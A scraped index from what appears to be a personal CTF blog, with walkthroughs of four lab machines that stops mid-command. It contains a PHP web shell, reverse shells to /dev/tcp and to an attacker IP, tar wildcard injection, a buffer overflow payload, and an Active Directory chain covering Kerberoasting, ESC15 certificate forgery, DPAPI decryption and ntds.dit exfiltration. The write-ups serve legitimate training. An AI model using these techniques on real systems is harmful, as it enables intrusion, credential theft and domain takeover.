HackMyVM"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/easy/showtime/","summary":"Difficulty: Easy 🟢","title":"ShowTime - Dockerlabs"},{"content":"\rMachine Link\nThe first thing we will do is perform a quick Nmap scan to see which ports are open.\nOnce we know the open ports, we will perform a more detailed scan on them to identify the services running and their versions.\nThe target machine is hosting an SSH server and a website. When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained! We log in as root and finally get the Root Flag.\nMachine completed!!\n","permalink":"http://localhost:1313/writeups/medium/silentdev/","summary":"Difficulty: Medium 🟠","title":"SilentDev - By me"},{"content":"\rMachine Link\nTo begin with, we perform a quick scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 192.168.1.233 Now with these open ports, we will run a more intensive scan to check which services are running behind them and their respective versions, saving the result in a file called target.\nThis version of FTP is not vulnerable to anonymous login, so what we’ll do is access the website hosted on the victim machine.\nWhen entering, we find this page, and when we click on any of the buttons at the bottom, we can view the contents of a file.\nOther than that, I don’t see anything interesting, so with the Gobuster tool we will enumerate subdirectories and files to see what we can find.\nNow we can start to understand what might be happening behind the \u0026ldquo;themes\u0026rdquo; parameter we saw earlier, because when we access /config.txt, we see the same content.\nThe file name passed through the parameter is encoded in some way, and if we pay attention, we see that the letters correspond to others and with a certain logic. In the end, we discovered that it is encoded with ROT13.\nI try reading a system file like /etc/passwd, and it works. It is vulnerable to LFI(Local File Inclusion).\nWe can’t access the /logs directory, but if we try enumerating inside it with Gobuster to see what\u0026rsquo;s there, we find a file.\nThey are the FTP server logs, where we see that two files were uploaded, which could be very useful for us.\nThe first file is a Python program that starts the FTP server and logs all connections and uploaded or downloaded files to a file.\nIt also gives us the password to access.\nThe second one is a reverse shell.\nIt looks like the rev.sh file is trying to give us a hint of where this is going. What we could do is insert a Reverse Shell inside the ftp_server.py itself, so when the machine boots up and runs the script to start the FTP server, the Reverse Shell executes as well, granting access to the machine.\nRevshell created in: Revshells.com\rI create the script with the payload included on my local machine, access via FTP, and replace it.\nInsert the payload\rWe also see that the files belong to the root user.\nNow, just start listening on port 4444, restart the victim machine, and wait for the shell to connect.\nWe get direct access as Root and capture the flags.\nMachine completed!! 💻🔥\n","permalink":"http://localhost:1313/writeups/very-easy/thirteen/","summary":"Difficulty: Very Easy 🔵","title":"Thirteen - HackMyVM"},{"content":"\rTo start, we perform a quick scan with Nmap to identify which ports are open on the target machine.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.72 Now we will perform a more detailed scan on these ports.\nnmap -sCV -p53,80,135,139,389,445,3269,49712,49727 -n -Pn 10.10.11.72 -oN target Let\u0026rsquo;s add the domain to /etc/hosts.\nHTB provides us with initial credentials for a user named Henry.\nhenry : H3nry_987TGV! There’s nothing we can do with the website hosted on port 80, so the next step is to use SMBMap to enumerate SMB shares on the host and check read/write permissions, which could allow us to access sensitive files or upload malicious files.\nsmbmap -H tombwatcher.htb -u henry -p H3nry_987TGV! After a few minutes of searching, I didn’t find anything. The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain. (Quick guide on installing and using BloodHound: BloodHound)\nWe obtain domain information using the following command:\nbloodhound-python -d \u0026#39;tombwatcher.htb\u0026#39; -u \u0026#39;henry\u0026#39; -p \u0026#39;H3nry_987TGV!\u0026#39; -gc \u0026#39;dc01.tombwatcher.htb\u0026#39; -ns 10.10.11.72 -v --zip -c all Then we upload the resulting ZIP file to BloodHound.\nWe search for the user Henry and find that we have WriteSPN permission on the user Alfred.\nHaving WriteSPN on another user means we can modify their SPN, which is a unique identifier linking a user or service account to a service in the domain for Kerberos authentication. This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly. This way, we can simulate the domain time and make Kerberos work.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; ./targetedKerberoast.py -v -d \u0026#39;tombwatcher.htb\u0026#39; -u \u0026#39;henry\u0026#39; -p \u0026#39;H3nry_987TGV!\u0026#39; We copy the hash and crack it with John The Ripper.\njohn -w=/usr/share/wordlists/rockyou.txt hash_alfred With access to the Alfred account, we look in BloodHound for a new way to escalate to another user.\nAs we can see, we have the ability to add Alfred to the INFRASTRUCTURE group. Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password. In this case, we use bloodyAD instead of impacket-owneredit because it allows us to work directly with account hashes in a simpler and more reliable way to change passwords without needing the plaintext password.\nbloodyAD --host 10.10.11.72 -d \u0026#39;tombwatcher.htb\u0026#39; -u \u0026#39;ansible_dev$\u0026#39; -p \u0026#39;:ecb4146b3f99e6bbf06ca896f504227c\u0026#39; set password SAM \u0026#39;sam123\u0026#39;\r[+] Password changed successfully! Now that we have access to Sam, we can take advantage of his WriteOwner on John, which means we can change the owner of John’s account and modify his permissions to take control of his account or escalate privileges within the domain.\nimpacket-owneredit -action write -new-owner \u0026#39;sam\u0026#39; -target \u0026#39;john\u0026#39; \u0026#39;tombwatcher.htb/sam:sam123\u0026#39; impacket-dacledit -action \u0026#39;write\u0026#39; -rights \u0026#39;FullControl\u0026#39; -principal \u0026#39;sam\u0026#39; -target \u0026#39;john\u0026#39; \u0026#39;tombwatcher.htb\u0026#39;/\u0026#39;sam\u0026#39;:\u0026#39;sam123\u0026#39; Now, taking advantage of the fact that Sam has FullControl over John, we change John’s password using BloodyAD with the following command:\nbloodyAD --host 10.10.11.72 -d \u0026#39;tombwatcher.htb\u0026#39; -u \u0026#39;sam\u0026#39; -p \u0026#39;sam123\u0026#39; set password john \u0026#39;john123\u0026#39; With the user John, we can access his account and obtain the User Flag, which is located in his Desktop folder.\nWe now have control of the user John, who has GenericAll over the ADCS OU. This OU corresponds to the Active Directory Certificate Services infrastructure, which manages certificate issuance and usage within the domain.\nWith this control, we can abuse the certificate configuration, and to do so, we use Certipy-AD, which allows us to enumerate, create, and request misconfigured certificates to escalate privileges within the domain.\ncertipy-ad find -u \u0026#39;john@tombwatcher.htb\u0026#39; -p \u0026#39;john123\u0026#39; -dc-ip 10.10.11.72 In the WebServer certificate template, we encounter a SID (S-1-5-21-1392491010-1358638721-2126982587-1111), so we decide to search the system to see which user or group it belongs to.\nGet-ADObject -Filter {ObjectSID -eq \u0026#34;S-1-5-21-1392491010-1358638721-2126982587-1111\u0026#34;} -Properties * Nothing is found, so this SID likely corresponds to a deleted user or group or a special internal domain object that no longer exists.\nTo verify if the SID corresponds to a deleted object in Active Directory, you can use PowerShell with the ActiveDirectory module and search in the Deleted Objects tomb.\nGet-ADObject -Filter {ObjectSID -eq \u0026#34;S-1-5-21-1392491010-1358638721-2126982587-1111\u0026#34;} -IncludeDeletedObjects -Properties * This will search the deleted objects and show whether that SID corresponds to a deleted user or group.\nResult:\n*Evil-WinRM* PS C:\\Users\\john\\Desktop\u0026gt; Get-ADObject -Filter {ObjectSID -eq \u0026#34;S-1-5-21-1392491010-1358638721-2126982587-1111\u0026#34;} -IncludeDeletedObjects -Properties *\raccountExpires : 9223372036854775807\rbadPasswordTime : 0\rbadPwdCount : 0\rCanonicalName : tombwatcher.htb/Deleted Objects/cert_admin\rDEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf\rCN : cert_admin\rDEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf\rcodePage : 0\rcountryCode : 0\rCreated : 11/16/2024 12:07:04 PM\rcreateTimeStamp : 11/16/2024 12:07:04 PM\rDeleted : True\rDescription :\rDisplayName :\rDistinguishedName : CN=cert_admin\\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb\rdSCorePropagationData : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}\rgivenName : cert_admin\rinstanceType : 4\risDeleted : True\rLastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb\rlastLogoff : 0\rlastLogon : 0\rlogonCount : 0\rModified : 11/16/2024 12:07:27 PM\rmodifyTimeStamp : 11/16/2024 12:07:27 PM\rmsDS-LastKnownRDN : cert_admin\rName : cert_admin\rDEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf\rnTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity\rObjectCategory :\rObjectClass : user\rObjectGUID : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf\robjectSid : S-1-5-21-1392491010-1358638721-2126982587-1111\rprimaryGroupID : 513\rProtectedFromAccidentalDeletion : False\rpwdLastSet : 133762504248946345\rsAMAccountName : cert_admin\rsDRightsEffective : 7\rsn : cert_admin\ruserAccountControl : 66048\ruSNChanged : 13197\ruSNCreated : 13186\rwhenChanged : 11/16/2024 12:07:27 PM\rwhenCreated : 11/16/2024 12:07:04 PM We can restore the deleted user cert_admin because it is still in the Deleted Objects tomb of Active Directory. This is confirmed by several indicators in the information we obtained: isDeleted: True shows the object exists but is deleted, and LastKnownParent: OU=ADCS shows where it was located before deletion. Additionally, since we have GenericAll over the ADCS OU with the user John, we have the necessary permissions to restore it.\nGet-ADObject -Filter {ObjectSID -eq \u0026#34;S-1-5-21-1392491010-1358638721-2126982587-1111\u0026#34;} -IncludeDeletedObjects | Restore-ADObject Next, we perform a new domain mapping from inside, using SharpHound.exe.\nwget https://github.com/SpecterOps/SharpHound/releases/download/v2.7.1/SharpHound_v2.7.1_windows_x86.zip\runzip SharpHound_v2.7.1_windows_x86.zip We upload the executable to the machine with Evil-WinRM:\nupload SharpHound.exe And run a full domain scan.\n.\\SharpHound.exe -c All -d tombwatcher.htb Finally, we download the resulting ZIP file using the download command followed by the file name.\nWe upload it to BloodHound, which now shows much more information about John than before.\nThe Cert_Admin user has been successfully restored, and since we have GenericAll over it, we proceed to change its password.\nbloodyAD --host 10.10.11.72 -d \u0026#39;tombwatcher.htb\u0026#39; -u \u0026#39;john\u0026#39; -p \u0026#39;john123\u0026#39; set password \u0026#39;cert_admin\u0026#39; \u0026#39;admin1234\u0026#39;\r[+] Password changed successfully! We then run Certipy-ad again, but this time using the Cert_Admin user to search for vulnerable certificates.\ncertipy-ad find -u cert_admin -p \u0026#39;admin1234\u0026#39; -dc-ip 10.10.11.72 -vulnerable Result:\nCertificate Authorities\r0\rCA Name : tombwatcher-CA-1\rDNS Name : DC01.tombwatcher.htb\rCertificate Subject : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb\rCertificate Serial Number : 3428A7FC52C310B2460F8440AA8327AC\rCertificate Validity Start : 2024-11-16 00:47:48+00:00\rCertificate Validity End : 2123-11-16 00:57:48+00:00\rWeb Enrollment\rHTTP\rEnabled : False\rHTTPS\rEnabled : False\rUser Specified SAN : Disabled\rRequest Disposition : Issue\rEnforce Encryption for Requests : Enabled\rActive Policy : CertificateAuthority_MicrosoftDefault.Policy\rPermissions\rOwner : TOMBWATCHER.HTB\\Administrators\rAccess Rights\rManageCa : TOMBWATCHER.HTB\\Administrators\rTOMBWATCHER.HTB\\Domain Admins\rTOMBWATCHER.HTB\\Enterprise Admins\rManageCertificates : TOMBWATCHER.HTB\\Administrators\rTOMBWATCHER.HTB\\Domain Admins\rTOMBWATCHER.HTB\\Enterprise Admins\rEnroll : TOMBWATCHER.HTB\\Authenticated Users\rCertificate Templates\r0\rTemplate Name : WebServer\rDisplay Name : Web Server\rCertificate Authorities : tombwatcher-CA-1\rEnabled : True\rClient Authentication : False\rEnrollment Agent : False\rAny Purpose : False\rEnrollee Supplies Subject : True\rCertificate Name Flag : EnrolleeSuppliesSubject\rExtended Key Usage : Server Authentication\rRequires Manager Approval : False\rRequires Key Archival : False\rAuthorized Signatures Required : 0\rSchema Version : 1\rValidity Period : 2 years\rRenewal Period : 6 weeks\rMinimum RSA Key Length : 2048\rTemplate Created : 2024-11-16T00:57:49+00:00\rTemplate Last Modified : 2024-11-16T17:07:26+00:00\rPermissions\rEnrollment Permissions\rEnrollment Rights : TOMBWATCHER.HTB\\Domain Admins\rTOMBWATCHER.HTB\\Enterprise Admins\rTOMBWATCHER.HTB\\cert_admin\rObject Control Permissions\rOwner : TOMBWATCHER.HTB\\Enterprise Admins\rFull Control Principals : TOMBWATCHER.HTB\\Domain Admins\rTOMBWATCHER.HTB\\Enterprise Admins\rWrite Owner Principals : TOMBWATCHER.HTB\\Domain Admins\rTOMBWATCHER.HTB\\Enterprise Admins\rWrite Dacl Principals : TOMBWATCHER.HTB\\Domain Admins\rTOMBWATCHER.HTB\\Enterprise Admins\rWrite Property Enroll : TOMBWATCHER.HTB\\Domain Admins\rTOMBWATCHER.HTB\\Enterprise Admins\rTOMBWATCHER.HTB\\cert_admin\r[+] User Enrollable Principals : TOMBWATCHER.HTB\\cert_admin\r[!] Vulnerabilities\rESC15 : Enrollee supplies subject and schema version is 1.\r[*] Remarks\rESC15 : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly. We use office2john to extract the password hash and save it to a file.\noffice2john Access_Review.xlsx \u0026gt; hash Then we use John The Ripper to crack the password.\njohn -w=/usr/share/wordlists/rockyou.txt hash Once we know the password, we can access the Excel file.\nWe obtain the credentials for the users svc_ldap and svc_iis.\nsvc_ldap : M1XyC9pW7qT5Vn\rsvc_iss : N5pXyW1VqM7CZ8 At this point, there’s nothing more interesting to explore.\nWe now choose svc_ldap instead of ryan.naylor for domain mapping with BloodHound, as this user has more extensive read permissions that allow collecting all relationships, ACLs, and possible escalation paths, whereas a normal user like ryan.naylor would have limited access.\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; bloodhound-python -d \u0026#39;voleur.htb\u0026#39; -u \u0026#39;svc_ldap\u0026#39; -p \u0026#39;M1XyC9pW7qT5Vn\u0026#39; -gc \u0026#39;dc.voleur.htb\u0026#39; -ns 10.10.11.76 -v --zip -c all We upload the resulting ZIP file to BloodHound and, analyzing the user svc_ldap, we see that they have WriteSPN permissions over the user svc_winrm and belong to the RESTORE_USERS group, which has GenericWrite permissions over lacey.miller. With these permissions, it is possible to perform a Kerberoasting Attack to extract the password hashes of these users.\nWe create another TGT, this time for the user svc_ldap.\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-getTGT voleur.htb/\u0026#39;svc_ldap\u0026#39;:\u0026#39;M1XyC9pW7qT5Vn\u0026#39;\rexport KRB5CCNAME=$PWD/svc_ldap.ccache Then we clone the targetedKerberoast repository and run it. It uses the svc_ldap TGT to request service tickets (SPNs) for which it has permissions. These tickets are encrypted as hashes, which we can then attempt to crack.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git faketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; python3 targetedKerberoast.py -v -d \u0026#39;voleur.htb\u0026#39; -u \u0026#39;svc_ldap\u0026#39; --dc-host dc.voleur.htb -k Finally, we use John the Ripper to crack the hashes.\njohn -w=/usr/share/wordlists/rockyou.txt hashes We obtain a single password, and after testing which account it belongs to, we realize it is for svc_winrm.\nChecking the Excel file, we see that this user has Remote Management permissions, so we can access the machine remotely using Evil-WinRM. To do this, we generate a new TGT, this time for the svc_winrm user.\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-getTGT voleur.htb/\u0026#39;svc_winrm\u0026#39;:\u0026#39;{SVC_WINRM-PASSWORD}\u0026#39;\rexport KRB5CCNAME=$PWD/svc_winrm.ccache In this case, we edit /etc/krb5.conf because Evil-WinRM cannot resolve the KDC by domain name, and using the IP directly allows the connection to work correctly.\n[libdefaults]\rdefault_realm = VOLEUR.HTB\r[realms]\rVOLEUR.HTB = {\rkdc = 10.10.11.76\radmin_server = 10.10.11.76\r}\r[domain_realm]\r.voleur.htb = VOLEUR.HTB\rvoleur.htb = VOLEUR.HTB faketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; evil-winrm -i dc.voleur.htb -r voleur.htb We obtain the User Flag, located in the Desktop directory.\nAs seen earlier, the user svc_ldap belongs to the RESTORE_USERS group, so if we access it, we can restore the user todd.wolfe, identified in the Excel file, whose password was provided: NightT1meP1dg3on14.\nThe first step is to upload RunasCS, an executable that allows us to run commands as another user.\nwget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip\runzip RunasCs.zip We upload it to the target machine via Evil-WinRM using the svc_winrm account.\nupload RunasCs.exe Next, we execute a Reverse Shell to access the machine as svc_ldap.\n.\\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.14.79:4444 Once inside, we search for the deleted user.\nGet-ADObject -Filter \u0026#39;isDeleted -eq $true\u0026#39; -IncludeDeletedObjects We restore it using its ObjectID.\nRestore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db With the todd.wolfe account restored, we can now access its shared resources. Before doing so, we create a TGT for this user so we can authenticate correctly and use their permissions.\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-getTGT voleur.htb/\u0026#39;todd.wolfe\u0026#39;:\u0026#39;NightT1meP1dg3on14\u0026#39;\rexport KRB5CCNAME=$PWD/todd.wolfe.ccache faketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/todd.wolfe@dc.voleur.htb Accessing the system as todd.wolfe, we can explore their AppData/Roaming/Microsoft directory, which contains critical folders like Credentials, Crypto, and Vault. These folders store sensitive information protected by DPAPI (Data Protection API), used by Windows to encrypt passwords, keys, and user certificates.\nSince we are already authenticated as the user, we can extract these files and decrypt them locally without attacking other account hashes. This exploits the known DPAPI Weakness / Credential Store Exposure, allowing us to retrieve the current user’s encrypted secrets.\nSensitive file extraction:\nMaster Key: contains the key to decrypt all of the user’s secrets. get /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88 Credentials: stores an encrypted password that can be recovered using the Master Key. get /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3 After downloading the sensitive files, we use impacket-dpapi to decrypt them. First, using the Master Key file, the user’s SID, and their password, we obtain the Master Key hash, representing the key protecting all user secrets. This hash is then used to decrypt any file protected by DPAPI.\nimpacket-dpapi masterkey \\\r-file 08949382-134f-4c63-b93c-ce52efc0aa88 \\\r-sid S-1-5-21-3927696377-1337352550-2781715495-1110 \\\r-password NightT1meP1dg3on14 With this hash, we can decrypt files inside Credentials, which may contain passwords or other encrypted secrets stored by the user.\nimpacket-dpapi credential \\\r-file 772275FAD58525253490A9B0039791D3 \\\r-key 0xd2832547d1d5e0a01... It contains the password for the user jeremy.combs.\nThe user jeremy.combs belongs to the THIRD-LINE TECHNICIANS group, allowing us to access the group’s shared resources and review stored information, after first creating the TGT for this user.\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/jeremy.combs@dc.voleur.htb Within the shared resources, we find two items of interest: a note and an id_rsa file, corresponding to an SSH private key.\nThe content of the note is:\nTo identify which user owns the private key, we generate the public key from it using:\nsudo ssh-keygen -y -f id_rsa The user’s name often appears at the end of the public key, allowing us to confirm the owner.\nIn the Nmap scan performed at the start, we had already identified that the SSH service is exposed on port 2222.\nBefore using the downloaded private key, we set the proper permissions.\nchmod 600 id_rsa With the key ready, we connect to the SSH server on port 2222 using the user svc_backup.\nssh -i id_rsa -p 2222 svc_backup@voleur.htb Connecting via SSH, we see we are in a Linux environment. Inspecting the /mnt mount point, we find the Windows C: volume accessible, meaning we can access the Windows filesystem from the Linux host. Inside /mnt/c/IT/Third-Line Support, we find a new folder called Backups and within it the Active Directory folder, which contains ntds.dit and ntds.jfm.\nntds.dit is the main Active Directory database, storing user accounts, groups, policies, and password hashes.\nntds.jfm is a log file that keeps the database consistent when changes are made or recovered.\nNext, we download them to our local machine so we can use them.\nscp -i id_rsa -P 2222 \u0026#34;svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Active Directory/*\u0026#34; . In addition to the AD database, we also need the SYSTEM file, which contains keys required to decrypt the hashes stored in ntds.dit. It is located at /mnt/c/IT/Third-Line Support/Backups/registry.\nscp -i id_rsa -P 2222 